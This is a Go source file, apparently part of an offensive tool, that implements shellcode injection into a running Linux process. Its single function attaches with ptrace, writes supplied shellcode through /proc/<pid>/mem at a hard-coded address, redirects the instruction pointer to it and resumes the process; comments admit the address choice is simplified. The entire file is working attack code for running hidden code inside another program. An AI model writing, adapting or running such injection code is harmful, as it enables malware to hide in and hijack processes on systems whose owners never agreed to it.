// +build linux

package injection

import (
	"fmt"
	"os"
	"syscall"

	"golang.org/x/sys/unix"
)

func (pi *ProcessInjection) injectLinux(pid int, shellcode []byte, method string) error {
	pi.logger.Info("Injecting shellcode into Linux process PID: %d", pid)
	
	// Use ptrace for Linux injection
	// Attach to target process
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return fmt.Errorf("failed to attach: %w", err)
	}
	defer syscall.PtraceDetach(pid)
	
	// Wait for attach to complete
	var status syscall.WaitStatus
	_, err = syscall.Wait4(pid, &status, 0, nil)
	if err != nil {
		return fmt.Errorf("failed to wait: %w", err)
	}
	
	// Get registers
	var regs unix.PtraceRegs
	err = unix.PtraceGetRegs(pid, &regs)
	if err != nil {
		return fmt.Errorf("failed to get registers: %w", err)
	}
	
	// Allocate memory in target process using mmap
	// For simplicity, we'll use /proc/[pid]/mem
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	memFile, err := os.OpenFile(memPath, os.O_RDWR, 0)
	if err != nil {
		return fmt.Errorf("failed to open process memory: %w", err)
	}
	defer memFile.Close()
	
	// Find available memory region (simplified - would need /proc/[pid]/maps parsing)
	// For now, use a fixed address (would need proper memory scanning)
	addr := uintptr(0x400000) // Example address
	
	// Write shellcode
	_, err = memFile.WriteAt(shellcode, int64(addr))
	if err != nil {
		return fmt.Errorf("failed to write shellcode: %w", err)
	}
	
	// Set instruction pointer to shellcode
	regs.Rip = uint64(addr)
	err = unix.PtraceSetRegs(pid, &regs)
	if err != nil {
		return fmt.Errorf("failed to set registers: %w", err)
	}
	
	// Continue execution
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("failed to continue: %w", err)
	}
	
	return nil
}

